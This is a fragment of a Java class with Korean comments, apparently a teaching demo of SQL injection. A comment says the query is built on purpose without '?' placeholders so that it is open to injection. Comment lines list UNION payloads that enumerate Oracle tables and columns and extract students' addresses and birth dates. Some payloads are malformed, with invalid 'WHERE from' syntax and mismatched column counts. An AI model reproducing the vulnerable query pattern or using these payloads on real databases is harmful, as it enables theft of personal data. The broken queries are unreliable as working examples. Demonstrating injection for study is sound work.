...
public class StudentInjectMain {
	...
	public static void main(String[] args) {
		...
		try {
			...
			//select 쿼리문작성 - preparedStatement를 사용했지만 ?를 쓰지않고 동적쿼리 구성 - SQL인젝션취약점이 발생하게 
...
///
/// OR 1=1 UNION SELECT TABLE_NAME, null, null, null, null, null, null from USER_TABLES --
///
/// 컬럼명을 확인하기 위한 공격문구
/// OR 1=1 UNION SELECT COLUMN_NAME, DATA_TYPE, null, null, null, null, null from ALL_TAB_COLUMNS WHERE TABLE_NAME='STUDENT'--
/// 컬럼명과 각 컬럼의 타입 정보까지 탈취
///
/// 데이터를 탈취하기 위한 공격 문구(컬럼명과 테이블명은 미리 확인)
/// 문자열 컬럼에 대해서 먼저 공격
/// OR 1=1 UNION SELECT STDADDRESS, DATA_TYPE, null, null, null, null from ALL_TAB_COLUMNS WHERE from STUDENT--
/// 학생 주소와 DPTNO 데이터 탈취
/// DATE 타입은 STDBIRTH 컬럼은 날짜를 문자로 변경해서 정보탈취 TO_CHAR()
/// OR 1=1 UNION SELECT TO_CHAR(STDBIRTH), null, null, null, null from STUDENT--
